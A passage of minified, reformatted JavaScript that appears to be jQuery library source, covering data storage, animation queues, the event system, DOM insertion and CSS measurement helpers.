            if (void 0 === n && 1 === e.nodeType) if (r = "data-" + t.replace(te, "-$&").toLowerCase(), "string" == typeof (n = e.getAttribute(r))) {
              try {
                n = function (e) {
                  return "true" === e || "false" !== e && ("null" === e ? null : e === +e + "" ? +e : ee.test(e) ? JSON.parse(e) : e);
                }(n);
              } catch (e) {}
              Z.set(e, t, n);
            } else n = void 0;
            return n;
          }
          T.extend({
            hasData: function (e) {
              return Z.hasData(e) || G.hasData(e);
            },
            data: function (e, t, n) {
              return Z.access(e, t, n);
            },
            removeData: function (e, t) {
              Z.remove(e, t);
            },
            _data: function (e, t, n) {
              return G.access(e, t, n);
            },
            _removeData: function (e, t) {
              G.remove(e, t);
            }
          }), T.fn.extend({
            data: function (e, t) {
              var n,
                r,
                i,
                o = this[0],
                a = o && o.attributes;
              if (void 0 === e) {
                if (this.length && (i = Z.get(o), 1 === o.nodeType && !G.get(o, "hasDataAttrs"))) {
                  for (n = a.length; n--;) a[n] && 0 === (r = a[n].name).indexOf("data-") && (r = X(r.slice(5)), ne(o, r, i[r]));
                  G.set(o, "hasDataAttrs", !0);
                }
                return i;
              }
              return "object" == typeof e ? this.each(function () {
                Z.set(this, e);
              }) : z(this, function (t) {
                var n;
                if (o && void 0 === t) return void 0 !== (n = Z.get(o, e)) || void 0 !== (n = ne(o, e)) ? n : void 0;
                this.each(function () {
                  Z.set(this, e, t);
                });
              }, null, t, arguments.length > 1, null, !0);
            },
            removeData: function (e) {
              return this.each(function () {
                Z.remove(this, e);
              });
            }
          }), T.extend({
            queue: function (e, t, n) {
              var r;
              if (e) return t = (t || "fx") + "queue", r = G.get(e, t), n && (!r || Array.isArray(n) ? r = G.access(e, t, T.makeArray(n)) : r.push(n)), r || [];
            },
            dequeue: function (e, t) {
              t = t || "fx";
              var n = T.queue(e, t),
                r = n.length,
                i = n.shift(),
                o = T._queueHooks(e, t);
              "inprogress" === i && (i = n.shift(), r--), i && ("fx" === t && n.unshift("inprogress"), delete o.stop, i.call(e, function () {
                T.dequeue(e, t);
              }, o)), !r && o && o.empty.fire();
            },
            _queueHooks: function (e, t) {
              var n = t + "queueHooks";
              return G.get(e, n) || G.access(e, n, {
                empty: T.Callbacks("once memory").add(function () {
                  G.remove(e, [t + "queue", n]);
                })
              });
            }
          }), T.fn.extend({
            queue: function (e, t) {
              var n = 2;
              return "string" != typeof e && (t = e, e = "fx", n--), arguments.length < n ? T.queue(this[0], e) : void 0 === t ? this : this.each(function () {
                var n = T.queue(this, e, t);
                T._queueHooks(this, e), "fx" === e && "inprogress" !== n[0] && T.dequeue(this, e);
              });
            },
            dequeue: function (e) {
              return this.each(function () {
                T.dequeue(this, e);
              });
            },
            clearQueue: function (e) {
              return this.queue(e || "fx", []);
            },
            promise: function (e, t) {
              var n,
                r = 1,
                i = T.Deferred(),
                o = this,
                a = this.length,
                u = function () {
                  --r || i.resolveWith(o, [o]);
                };
              for ("string" != typeof e && (t = e, e = void 0), e = e || "fx"; a--;) (n = G.get(o[a], e + "queueHooks")) && n.empty && (r++, n.empty.add(u));
              return u(), i.promise(t);
            }
          });
          var re = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
            ie = new RegExp("^(?:([+-])=|)(" + re + ")([a-z%]*)$", "i"),
            oe = ["Top", "Right", "Bottom", "Left"],
            ae = b.documentElement,
            ue = function (e) {
              return T.contains(e.ownerDocument, e);
            },
            se = {
              composed: !0
            };
          ae.getRootNode && (ue = function (e) {
            return T.contains(e.ownerDocument, e) || e.getRootNode(se) === e.ownerDocument;
          });
          var de = function (e, t) {
            return "none" === (e = t || e).style.display || "" === e.style.display && ue(e) && "none" === T.css(e, "display");
          };
          function le(e, t, n, r) {
            var i,
              o,
              a = 20,
              u = r ? function () {
                return r.cur();
              } : function () {
                return T.css(e, t, "");
              },
              s = u(),
              d = n && n[3] || (T.cssNumber[t] ? "" : "px"),
              l = e.nodeType && (T.cssNumber[t] || "px" !== d && +s) && ie.exec(T.css(e, t));
            if (l && l[3] !== d) {
              for (s /= 2, d = d || l[3], l = +s || 1; a--;) T.style(e, t, l + d), (1 - o) * (1 - (o = u() / s || .5)) <= 0 && (a = 0), l /= o;
              l *= 2, T.style(e, t, l + d), n = n || [];
            }
            return n && (l = +l || +s || 0, i = n[1] ? l + (n[1] + 1) * n[2] : +n[2], r && (r.unit = d, r.start = l, r.end = i)), i;
          }
          var ce = {};
          function fe(e) {
            var t,
              n = e.ownerDocument,
              r = e.nodeName,
              i = ce[r];
            return i || (t = n.body.appendChild(n.createElement(r)), i = T.css(t, "display"), t.parentNode.removeChild(t), "none" === i && (i = "block"), ce[r] = i, i);
          }
          function he(e, t) {
            for (var n, r, i = [], o = 0, a = e.length; o < a; o++) (r = e[o]).style && (n = r.style.display, t ? ("none" === n && (i[o] = G.get(r, "display") || null, i[o] || (r.style.display = "")), "" === r.style.display && de(r) && (i[o] = fe(r))) : "none" !== n && (i[o] = "none", G.set(r, "display", n)));
            for (o = 0; o < a; o++) null != i[o] && (e[o].style.display = i[o]);
            return e;
          }
          T.fn.extend({
            show: function () {
              return he(this, !0);
            },
            hide: function () {
              return he(this);
            },
            toggle: function (e) {
              return "boolean" == typeof e ? e ? this.show() : this.hide() : this.each(function () {
                de(this) ? T(this).show() : T(this).hide();
              });
            }
          });
          var pe,
            me,
            ge = /^(?:checkbox|radio)$/i,
            ve = /<([a-z][^\/\0>\x20\t\r\n\f]*)/i,
            ye = /^$|^module$|\/(?:java|ecma)script/i;
          pe = b.createDocumentFragment().appendChild(b.createElement("div")), (me = b.createElement("input")).setAttribute("type", "radio"), me.setAttribute("checked", "checked"), me.setAttribute("name", "t"), pe.appendChild(me), g.checkClone = pe.cloneNode(!0).cloneNode(!0).lastChild.checked, pe.innerHTML = "<textarea>x</textarea>", g.noCloneChecked = !!pe.cloneNode(!0).lastChild.defaultValue, pe.innerHTML = "<option></option>", g.option = !!pe.lastChild;
          var be = {
            thead: [1, "<table>", "</table>"],
            col: [2, "<table><colgroup>", "</colgroup></table>"],
            tr: [2, "<table><tbody>", "</tbody></table>"],
            td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
            _default: [0, "", ""]
          };
          function we(e, t) {
            var n;
            return n = void 0 !== e.getElementsByTagName ? e.getElementsByTagName(t || "*") : void 0 !== e.querySelectorAll ? e.querySelectorAll(t || "*") : [], void 0 === t || t && k(e, t) ? T.merge([e], n) : n;
          }
          function _e(e, t) {
            for (var n = 0, r = e.length; n < r; n++) G.set(e[n], "globalEval", !t || G.get(t[n], "globalEval"));
          }
          be.tbody = be.tfoot = be.colgroup = be.caption = be.thead, be.th = be.td, g.option || (be.optgroup = be.option = [1, "<select multiple='multiple'>", "</select>"]);
          var Ee = /<|&#?\w+;/;
          function xe(e, t, n, r, i) {
            for (var o, a, u, s, d, l, c = t.createDocumentFragment(), f = [], h = 0, p = e.length; h < p; h++) if ((o = e[h]) || 0 === o) if ("object" === E(o)) T.merge(f, o.nodeType ? [o] : o);else if (Ee.test(o)) {
              for (a = a || c.appendChild(t.createElement("div")), u = (ve.exec(o) || ["", ""])[1].toLowerCase(), s = be[u] || be._default, a.innerHTML = s[1] + T.htmlPrefilter(o) + s[2], l = s[0]; l--;) a = a.lastChild;
              T.merge(f, a.childNodes), (a = c.firstChild).textContent = "";
            } else f.push(t.createTextNode(o));
            for (c.textContent = "", h = 0; o = f[h++];) if (r && T.inArray(o, r) > -1) i && i.push(o);else if (d = ue(o), a = we(c.appendChild(o), "script"), d && _e(a), n) for (l = 0; o = a[l++];) ye.test(o.type || "") && n.push(o);
            return c;
          }
          var Te = /^key/,
            Ce = /^(?:mouse|pointer|contextmenu|drag|drop)|click/,
            Se = /^([^.]*)(?:\.(.+)|)/;
          function De() {
            return !0;
          }
          function Ae() {
            return !1;
          }
          function $e(e, t) {
            return e === function () {
              try {
                return b.activeElement;
              } catch (e) {}
            }() == ("focus" === t);
          }
          function ke(e, t, n, r, i, o) {
            var a, u;
            if ("object" == typeof t) {
              for (u in "string" != typeof n && (r = r || n, n = void 0), t) ke(e, u, n, r, t[u], o);
              return e;
            }
            if (null == r && null == i ? (i = n, r = n = void 0) : null == i && ("string" == typeof n ? (i = r, r = void 0) : (i = r, r = n, n = void 0)), !1 === i) i = Ae;else if (!i) return e;
            return 1 === o && (a = i, i = function (e) {
              return T().off(e), a.apply(this, arguments);
            }, i.guid = a.guid || (a.guid = T.guid++)), e.each(function () {
              T.event.add(this, t, i, r, n);
            });
          }
          function Ne(e, t, n) {
            n ? (G.set(e, t, !1), T.event.add(e, t, {
              namespace: !1,
              handler: function (e) {
                var r,
                  i,
                  o = G.get(this, t);
                if (1 & e.isTrigger && this[t]) {
                  if (o.length) (T.event.special[t] || {}).delegateType && e.stopPropagation();else if (o = u.call(arguments), G.set(this, t, o), r = n(this, t), this[t](), o !== (i = G.get(this, t)) || r ? G.set(this, t, !1) : i = {}, o !== i) return e.stopImmediatePropagation(), e.preventDefault(), i.value;
                } else o.length && (G.set(this, t, {
                  value: T.event.trigger(T.extend(o[0], T.Event.prototype), o.slice(1), this)
                }), e.stopImmediatePropagation());
              }
            })) : void 0 === G.get(e, t) && T.event.add(e, t, De);
          }
          T.event = {
            global: {},
            add: function (e, t, n, r, i) {
              var o,
                a,
                u,
                s,
                d,
                l,
                c,
                f,
                h,
                p,
                m,
                g = G.get(e);
              if (K(e)) for (n.handler && (n = (o = n).handler, i = o.selector), i && T.find.matchesSelector(ae, i), n.guid || (n.guid = T.guid++), (s = g.events) || (s = g.events = Object.create(null)), (a = g.handle) || (a = g.handle = function (t) {
                return void 0 !== T && T.event.triggered !== t.type ? T.event.dispatch.apply(e, arguments) : void 0;
              }), d = (t = (t || "").match(F) || [""]).length; d--;) h = m = (u = Se.exec(t[d]) || [])[1], p = (u[2] || "").split(".").sort(), h && (c = T.event.special[h] || {}, h = (i ? c.delegateType : c.bindType) || h, c = T.event.special[h] || {}, l = T.extend({
                type: h,
                origType: m,
                data: r,
                handler: n,
                guid: n.guid,
                selector: i,
                needsContext: i && T.expr.match.needsContext.test(i),
                namespace: p.join(".")
              }, o), (f = s[h]) || ((f = s[h] = []).delegateCount = 0, c.setup && !1 !== c.setup.call(e, r, p, a) || e.addEventListener && e.addEventListener(h, a)), c.add && (c.add.call(e, l), l.handler.guid || (l.handler.guid = n.guid)), i ? f.splice(f.delegateCount++, 0, l) : f.push(l), T.event.global[h] = !0);
            },
            remove: function (e, t, n, r, i) {
              var o,
                a,
                u,
                s,
                d,
                l,
                c,
                f,
                h,
                p,
                m,
                g = G.hasData(e) && G.get(e);
              if (g && (s = g.events)) {
                for (d = (t = (t || "").match(F) || [""]).length; d--;) if (h = m = (u = Se.exec(t[d]) || [])[1], p = (u[2] || "").split(".").sort(), h) {
                  for (c = T.event.special[h] || {}, f = s[h = (r ? c.delegateType : c.bindType) || h] || [], u = u[2] && new RegExp("(^|\\.)" + p.join("\\.(?:.*\\.|)") + "(\\.|$)"), a = o = f.length; o--;) l = f[o], !i && m !== l.origType || n && n.guid !== l.guid || u && !u.test(l.namespace) || r && r !== l.selector && ("**" !== r || !l.selector) || (f.splice(o, 1), l.selector && f.delegateCount--, c.remove && c.remove.call(e, l));
                  a && !f.length && (c.teardown && !1 !== c.teardown.call(e, p, g.handle) || T.removeEvent(e, h, g.handle), delete s[h]);
                } else for (h in s) T.event.remove(e, h + t[d], n, r, !0);
                T.isEmptyObject(s) && G.remove(e, "handle events");
              }
            },
            dispatch: function (e) {
              var t,
                n,
                r,
                i,
                o,
                a,
                u = new Array(arguments.length),
                s = T.event.fix(e),
                d = (G.get(this, "events") || Object.create(null))[s.type] || [],
                l = T.event.special[s.type] || {};
              for (u[0] = s, t = 1; t < arguments.length; t++) u[t] = arguments[t];
              if (s.delegateTarget = this, !l.preDispatch || !1 !== l.preDispatch.call(this, s)) {
                for (a = T.event.handlers.call(this, s, d), t = 0; (i = a[t++]) && !s.isPropagationStopped();) for (s.currentTarget = i.elem, n = 0; (o = i.handlers[n++]) && !s.isImmediatePropagationStopped();) s.rnamespace && !1 !== o.namespace && !s.rnamespace.test(o.namespace) || (s.handleObj = o, s.data = o.data, void 0 !== (r = ((T.event.special[o.origType] || {}).handle || o.handler).apply(i.elem, u)) && !1 === (s.result = r) && (s.preventDefault(), s.stopPropagation()));
                return l.postDispatch && l.postDispatch.call(this, s), s.result;
              }
            },
            handlers: function (e, t) {
              var n,
                r,
                i,
                o,
                a,
                u = [],
                s = t.delegateCount,
                d = e.target;
              if (s && d.nodeType && !("click" === e.type && e.button >= 1)) for (; d !== this; d = d.parentNode || this) if (1 === d.nodeType && ("click" !== e.type || !0 !== d.disabled)) {
                for (o = [], a = {}, n = 0; n < s; n++) void 0 === a[i = (r = t[n]).selector + " "] && (a[i] = r.needsContext ? T(i, this).index(d) > -1 : T.find(i, this, null, [d]).length), a[i] && o.push(r);
                o.length && u.push({
                  elem: d,
                  handlers: o
                });
              }
              return d = this, s < t.length && u.push({
                elem: d,
                handlers: t.slice(s)
              }), u;
            },
            addProp: function (e, t) {
              Object.defineProperty(T.Event.prototype, e, {
                enumerable: !0,
                configurable: !0,
                get: v(t) ? function () {
                  if (this.originalEvent) return t(this.originalEvent);
                } : function () {
                  if (this.originalEvent) return this.originalEvent[e];
                },
                set: function (t) {
                  Object.defineProperty(this, e, {
                    enumerable: !0,
                    configurable: !0,
                    writable: !0,
                    value: t
                  });
                }
              });
            },
            fix: function (e) {
              return e[T.expando] ? e : new T.Event(e);
            },
            special: {
              load: {
                noBubble: !0
              },
              click: {
                setup: function (e) {
                  var t = this || e;
                  return ge.test(t.type) && t.click && k(t, "input") && Ne(t, "click", De), !1;
                },
                trigger: function (e) {
                  var t = this || e;
                  return ge.test(t.type) && t.click && k(t, "input") && Ne(t, "click"), !0;
                },
                _default: function (e) {
                  var t = e.target;
                  return ge.test(t.type) && t.click && k(t, "input") && G.get(t, "click") || k(t, "a");
                }
              },
              beforeunload: {
                postDispatch: function (e) {
                  void 0 !== e.result && e.originalEvent && (e.originalEvent.returnValue = e.result);
                }
              }
            }
          }, T.removeEvent = function (e, t, n) {
            e.removeEventListener && e.removeEventListener(t, n);
          }, T.Event = function (e, t) {
            if (!(this instanceof T.Event)) return new T.Event(e, t);
            e && e.type ? (this.originalEvent = e, this.type = e.type, this.isDefaultPrevented = e.defaultPrevented || void 0 === e.defaultPrevented && !1 === e.returnValue ? De : Ae, this.target = e.target && 3 === e.target.nodeType ? e.target.parentNode : e.target, this.currentTarget = e.currentTarget, this.relatedTarget = e.relatedTarget) : this.type = e, t && T.extend(this, t), this.timeStamp = e && e.timeStamp || Date.now(), this[T.expando] = !0;
          }, T.Event.prototype = {
            constructor: T.Event,
            isDefaultPrevented: Ae,
            isPropagationStopped: Ae,
            isImmediatePropagationStopped: Ae,
            isSimulated: !1,
            preventDefault: function () {
              var e = this.originalEvent;
              this.isDefaultPrevented = De, e && !this.isSimulated && e.preventDefault();
            },
            stopPropagation: function () {
              var e = this.originalEvent;
              this.isPropagationStopped = De, e && !this.isSimulated && e.stopPropagation();
            },
            stopImmediatePropagation: function () {
              var e = this.originalEvent;
              this.isImmediatePropagationStopped = De, e && !this.isSimulated && e.stopImmediatePropagation(), this.stopPropagation();
            }
          }, T.each({
            altKey: !0,
            bubbles: !0,
            cancelable: !0,
            changedTouches: !0,
            ctrlKey: !0,
            detail: !0,
            eventPhase: !0,
            metaKey: !0,
            pageX: !0,
            pageY: !0,
            shiftKey: !0,
            view: !0,
            char: !0,
            code: !0,
            charCode: !0,
            key: !0,
            keyCode: !0,
            button: !0,
            buttons: !0,
            clientX: !0,
            clientY: !0,
            offsetX: !0,
            offsetY: !0,
            pointerId: !0,
            pointerType: !0,
            screenX: !0,
            screenY: !0,
            targetTouches: !0,
            toElement: !0,
            touches: !0,
            which: function (e) {
              var t = e.button;
              return null == e.which && Te.test(e.type) ? null != e.charCode ? e.charCode : e.keyCode : !e.which && void 0 !== t && Ce.test(e.type) ? 1 & t ? 1 : 2 & t ? 3 : 4 & t ? 2 : 0 : e.which;
            }
          }, T.event.addProp), T.each({
            focus: "focusin",
            blur: "focusout"
          }, function (e, t) {
            T.event.special[e] = {
              setup: function () {
                return Ne(this, e, $e), !1;
              },
              trigger: function () {
                return Ne(this, e), !0;
              },
              delegateType: t
            };
          }), T.each({
            mouseenter: "mouseover",
            mouseleave: "mouseout",
            pointerenter: "pointerover",
            pointerleave: "pointerout"
          }, function (e, t) {
            T.event.special[e] = {
              delegateType: t,
              bindType: t,
              handle: function (e) {
                var n,
                  r = e.relatedTarget,
                  i = e.handleObj;
                return r && (r === this || T.contains(this, r)) || (e.type = i.origType, n = i.handler.apply(this, arguments), e.type = t), n;
              }
            };
          }), T.fn.extend({
            on: function (e, t, n, r) {
              return ke(this, e, t, n, r);
            },
            one: function (e, t, n, r) {
              return ke(this, e, t, n, r, 1);
            },
            off: function (e, t, n) {
              var r, i;
              if (e && e.preventDefault && e.handleObj) return r = e.handleObj, T(e.delegateTarget).off(r.namespace ? r.origType + "." + r.namespace : r.origType, r.selector, r.handler), this;
              if ("object" == typeof e) {
                for (i in e) this.off(i, t, e[i]);
                return this;
              }
              return !1 !== t && "function" != typeof t || (n = t, t = void 0), !1 === n && (n = Ae), this.each(function () {
                T.event.remove(this, e, n, t);
              });
            }
          });
          var Oe = /<script|<style|<link/i,
            je = /checked\s*(?:[^=]|=\s*.checked.)/i,
            Re = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;
          function Pe(e, t) {
            return k(e, "table") && k(11 !== t.nodeType ? t : t.firstChild, "tr") && T(e).children("tbody")[0] || e;
          }
          function Le(e) {
            return e.type = (null !== e.getAttribute("type")) + "/" + e.type, e;
          }
          function Ie(e) {
            return "true/" === (e.type || "").slice(0, 5) ? e.type = e.type.slice(5) : e.removeAttribute("type"), e;
          }
          function Fe(e, t) {
            var n, r, i, o, a, u;
            if (1 === t.nodeType) {
              if (G.hasData(e) && (u = G.get(e).events)) for (i in G.remove(t, "handle events"), u) for (n = 0, r = u[i].length; n < r; n++) T.event.add(t, i, u[i][n]);
              Z.hasData(e) && (o = Z.access(e), a = T.extend({}, o), Z.set(t, a));
            }
          }
          function Be(e, t) {
            var n = t.nodeName.toLowerCase();
            "input" === n && ge.test(e.type) ? t.checked = e.checked : "input" !== n && "textarea" !== n || (t.defaultValue = e.defaultValue);
          }
          function Me(e, t, n, r) {
            t = s(t);
            var i,
              o,
              a,
              u,
              d,
              l,
              c = 0,
              f = e.length,
              h = f - 1,
              p = t[0],
              m = v(p);
            if (m || f > 1 && "string" == typeof p && !g.checkClone && je.test(p)) return e.each(function (i) {
              var o = e.eq(i);
              m && (t[0] = p.call(this, i, o.html())), Me(o, t, n, r);
            });
            if (f && (o = (i = xe(t, e[0].ownerDocument, !1, e, r)).firstChild, 1 === i.childNodes.length && (i = o), o || r)) {
              for (u = (a = T.map(we(i, "script"), Le)).length; c < f; c++) d = i, c !== h && (d = T.clone(d, !0, !0), u && T.merge(a, we(d, "script"))), n.call(e[c], d, c);
              if (u) for (l = a[a.length - 1].ownerDocument, T.map(a, Ie), c = 0; c < u; c++) d = a[c], ye.test(d.type || "") && !G.access(d, "globalEval") && T.contains(l, d) && (d.src && "module" !== (d.type || "").toLowerCase() ? T._evalUrl && !d.noModule && T._evalUrl(d.src, {
                nonce: d.nonce || d.getAttribute("nonce")
              }, l) : _(d.textContent.replace(Re, ""), d, l));
            }
            return e;
          }
          function Ue(e, t, n) {
            for (var r, i = t ? T.filter(t, e) : e, o = 0; null != (r = i[o]); o++) n || 1 !== r.nodeType || T.cleanData(we(r)), r.parentNode && (n && ue(r) && _e(we(r, "script")), r.parentNode.removeChild(r));
            return e;
          }
          T.extend({
            htmlPrefilter: function (e) {
              return e;
            },
            clone: function (e, t, n) {
              var r,
                i,
                o,
                a,
                u = e.cloneNode(!0),
                s = ue(e);
              if (!(g.noCloneChecked || 1 !== e.nodeType && 11 !== e.nodeType || T.isXMLDoc(e))) for (a = we(u), r = 0, i = (o = we(e)).length; r < i; r++) Be(o[r], a[r]);
              if (t) if (n) for (o = o || we(e), a = a || we(u), r = 0, i = o.length; r < i; r++) Fe(o[r], a[r]);else Fe(e, u);
              return (a = we(u, "script")).length > 0 && _e(a, !s && we(e, "script")), u;
            },
            cleanData: function (e) {
              for (var t, n, r, i = T.event.special, o = 0; void 0 !== (n = e[o]); o++) if (K(n)) {
                if (t = n[G.expando]) {
                  if (t.events) for (r in t.events) i[r] ? T.event.remove(n, r) : T.removeEvent(n, r, t.handle);
                  n[G.expando] = void 0;
                }
                n[Z.expando] && (n[Z.expando] = void 0);
              }
            }
          }), T.fn.extend({
            detach: function (e) {
              return Ue(this, e, !0);
            },
            remove: function (e) {
              return Ue(this, e);
            },
            text: function (e) {
              return z(this, function (e) {
                return void 0 === e ? T.text(this) : this.empty().each(function () {
                  1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || (this.textContent = e);
                });
              }, null, e, arguments.length);
            },
            append: function () {
              return Me(this, arguments, function (e) {
                1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || Pe(this, e).appendChild(e);
              });
            },
            prepend: function () {
              return Me(this, arguments, function (e) {
                if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
                  var t = Pe(this, e);
                  t.insertBefore(e, t.firstChild);
                }
              });
            },
            before: function () {
              return Me(this, arguments, function (e) {
                this.parentNode && this.parentNode.insertBefore(e, this);
              });
            },
            after: function () {
              return Me(this, arguments, function (e) {
                this.parentNode && this.parentNode.insertBefore(e, this.nextSibling);
              });
            },
            empty: function () {
              for (var e, t = 0; null != (e = this[t]); t++) 1 === e.nodeType && (T.cleanData(we(e, !1)), e.textContent = "");
              return this;
            },
            clone: function (e, t) {
              return e = null != e && e, t = null == t ? e : t, this.map(function () {
                return T.clone(this, e, t);
              });
            },
            html: function (e) {
              return z(this, function (e) {
                var t = this[0] || {},
                  n = 0,
                  r = this.length;
                if (void 0 === e && 1 === t.nodeType) return t.innerHTML;
                if ("string" == typeof e && !Oe.test(e) && !be[(ve.exec(e) || ["", ""])[1].toLowerCase()]) {
                  e = T.htmlPrefilter(e);
                  try {
                    for (; n < r; n++) 1 === (t = this[n] || {}).nodeType && (T.cleanData(we(t, !1)), t.innerHTML = e);
                    t = 0;
                  } catch (e) {}
                }
                t && this.empty().append(e);
              }, null, e, arguments.length);
            },
            replaceWith: function () {
              var e = [];
              return Me(this, arguments, function (t) {
                var n = this.parentNode;
                T.inArray(this, e) < 0 && (T.cleanData(we(this)), n && n.replaceChild(t, this));
              }, e);
            }
          }), T.each({
            appendTo: "append",
            prependTo: "prepend",
            insertBefore: "before",
            insertAfter: "after",
            replaceAll: "replaceWith"
          }, function (e, t) {
            T.fn[e] = function (e) {
              for (var n, r = [], i = T(e), o = i.length - 1, a = 0; a <= o; a++) n = a === o ? this : this.clone(!0), T(i[a])[t](n), d.apply(r, n.get());
              return this.pushStack(r);
            };
          });
          var qe = new RegExp("^(" + re + ")(?!px)[a-z%]+$", "i"),
            He = function (e) {
              var t = e.ownerDocument.defaultView;
              return t && t.opener || (t = r), t.getComputedStyle(e);
            },
            We = function (e, t, n) {
              var r,
                i,
                o = {};
              for (i in t) o[i] = e.style[i], e.style[i] = t[i];
              for (i in r = n.call(e), t) e.style[i] = o[i];
              return r;
            },
            ze = new RegExp(oe.join("|"), "i");
          function Ye(e, t, n) {
            var r,
              i,
              o,
              a,
              u = e.style;
            return (n = n || He(e)) && ("" !== (a = n.getPropertyValue(t) || n[t]) || ue(e) || (a = T.style(e, t)), !g.pixelBoxStyles() && qe.test(a) && ze.test(t) && (r = u.width, i = u.minWidth, o = u.maxWidth, u.minWidth = u.maxWidth = u.width = a, a = n.width, u.width = r, u.minWidth = i, u.maxWidth = o)), void 0 !== a ? a + "" : a;
          }
          function Ve(e, t) {
            return {
              get: function () {
                if (!e()) return (this.get = t).apply(this, arguments);
                delete this.get;
              }
            };
          }
          !function () {
            function e() {
              if (l) {
                d.style.cssText = "position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0", l.style.cssText = "position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%", ae.appendChild(d).appendChild(l);
                var e = r.getComputedStyle(l);
                n = "1%" !== e.top, s = 12 === t(e.marginLeft), l.style.right = "60%", a = 36 === t(e.right), i = 36 === t(e.width), l.style.position = "absolute", o = 12 === t(l.offsetWidth / 3), ae.removeChild(d), l = null;
              }
            }
            function t(e) {
              return Math.round(parseFloat(e));
            }
            var n,
              i,
              o,
              a,
              u,
              s,
              d = b.createElement("div"),
              l = b.createElement("div");
            l.style && (l.style.backgroundClip = "content-box", l.cloneNode(!0).style.backgroundClip = "", g.clearCloneStyle = "content-box" === l.style.backgroundClip, T.extend(g, {
              boxSizingReliable: function () {
                return e(), i;
              },
              pixelBoxStyles: function () {
                return e(), a;
              },
              pixelPosition: function () {
                return e(), n;
              },
              reliableMarginLeft: function () {
                return e(), s;
              },
              scrollboxSize: function () {
                return e(), o;
              },
              reliableTrDimensions: function () {
                var e, t, n, i;
                return null == u && (e = b.createElement("table"), t = b.createElement("tr"), n = b.createElement("div"), e.style.cssText = "position:absolute;left:-11111px", t.style.height = "1px", n.style.height = "9px", ae.appendChild(e).appendChild(t).appendChild(n), i = r.getComputedStyle(t), u = parseInt(i.height) > 3, ae.removeChild(e)), u;
              }
            }));
          }();
          var Qe = ["Webkit", "Moz", "ms"],
            Xe = b.createElement("div").style,
            Ke = {};
          function Je(e) {
            var t = T.cssProps[e] || Ke[e];
            return t || (e in Xe ? e : Ke[e] = function (e) {
              for (var t = e[0].toUpperCase() + e.slice(1), n = Qe.length; n--;) if ((e = Qe[n] + t) in Xe) return e;
            }(e) || e);
          }
          var Ge = /^(none|table(?!-c[ea]).+)/,
            Ze = /^--/,
            et = {
              position: "absolute",
              visibility: "hidden",
              display: "block"
            },
            tt = {
              letterSpacing: "0",
              fontWeight: "400"
            };
          function nt(e, t, n) {
            var r = ie.exec(t);
            return r ? Math.max(0, r[2] - (n || 0)) + (r[3] || "px") : t;
          }
          function rt(e, t, n, r, i, o) {
            var a = "width" === t ? 1 : 0,
              u = 0,
              s = 0;
            if (n === (r ? "border" : "content")) return 0;
            for (; a < 4; a += 2) "margin" === n && (s += T.css(e, n + oe[a], !0, i)), r ? ("content" === n && (s -= T.css(e, "padding" + oe[a], !0, i)), "margin" !== n && (s -= T.css(e, "border" + oe[a] + "Width", !0, i))) : (s += T.css(e, "padding" + oe[a], !0, i), "padding" !== n ? s += T.css(e, "border" + oe[a] + "Width", !0, i) : u += T.css(e, "border" + oe[a] + "Width", !0, i));
            return !r && o >= 0 && (s += Math.max(0, Math.ceil(e["offset" + t[0].toUpperCase() + t.slice(1)] - o - s - u - .5)) || 0), s;
          }
          function it(e, t, n) {
            var r = He(e),
              i = (!g.boxSizingReliable() || n) && "border-box" === T.css(e, "boxSizing", !1, r),
              o = i,
              a = Ye(e, t, r),
              u = "offset" + t[0].toUpperCase() + t.slice(1);
            if (qe.test(a)) {
              if (!n) return a;
              a = "auto";
            }
            return (!g.boxSizingReliable() && i || !g.reliableTrDimensions() && k(e, "tr") || "auto" === a || !parseFloat(a) && "inline" === T.css(e, "display", !1, r)) && e.getClientRects().length && (i = "border-box" === T.css(e, "boxSizing", !1, r), (o = u in e) && (a = e[u])), (a = parseFloat(a) || 0) + rt(e, t, n || (i ? "border" : "content"), o, r, a) + "px";
          }
          function ot(e, t, n, r, i) {
            return new ot.prototype.init(e, t, n, r, i);
          }
          T.extend({
            cssHooks: {
              opacity: {
                get: function (e, t) {
                  if (t) {
                    var n = Ye(e, "opacity");
                    return "" === n ? "1" : n;
                  }
                }
              }
            },
            cssNumber: {
              animationIterationCount: !0,
              columnCount: !0,
              fillOpacity: !0,
              flexGrow: !0,
              flexShrink: !0,
              fontWeight: !0,
              gridArea: !0,
              gridColumn: !0,
              gridColumnEnd: !0,
              gridColumnStart: !0,
              gridRow: !0,
              gridRowEnd: !0,
              gridRowStart: !0,
              lineHeight: !0,
              opacity: !0,
              order: !0,
              orphans: !0,
              widows: !0,
              zIndex: !0,
              zoom: !0
            },
            cssProps: {},
            style: function (e, t, n, r) {
              if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) {
                var i,
                  o,
                  a,
                  u = X(t),
                  s = Ze.test(t),
                  d = e.style;
                if (s || (t = Je(u)), a = T.cssHooks[t] || T.cssHooks[u], void 0 === n) return a && "get" in a && void 0 !== (i = a.get(e, !1, r)) ? i : d[t];
                "string" === (o = typeof n) && (i = ie.exec(n)) && i[1] && (n = le(e, t, i), o = "number"), null != n && n == n && ("number" !== o || s || (n += i && i[3] || (T.cssNumber[u] ? "" : "px")), g.clearCloneStyle || "" !== n || 0 !== t.indexOf("background") || (d[t] = "inherit"), a && "set" in a && void 0 === (n = a.set(e, n, r)) || (s ? d.setProperty(t, n) : d[t] = n));
              }
            },
            css: function (e, t, n, r) {
              var i,
                o,
                a,
                u = X(t);
              return Ze.test(t) || (t = Je(u)), (a = T.cssHooks[t] || T.cssHooks[u]) && "get" in a && (i = a.get(e, !0, n)), void 0 === i && (i = Ye(e, t, r)), "normal" === i && t in tt && (i = tt[t]), "" === n || n ? (o = parseFloat(i), !0 === n || isFinite(o) ? o || 0 : i) : i;
            }
          }), T.each(["height", "width"], function (e, t) {
            T.cssHooks[t] = {
              get: function (e, n, r) {
                if (n) return !Ge.test(T.css(e, "display")) || e.getClientRects().length && e.getBoundingClientRect().width ? it(e, t, r) : We(e, et, function () {
                  return it(e, t, r);
                });
              },
              set: function (e, n, r) {
                var i,
                  o = He(e),
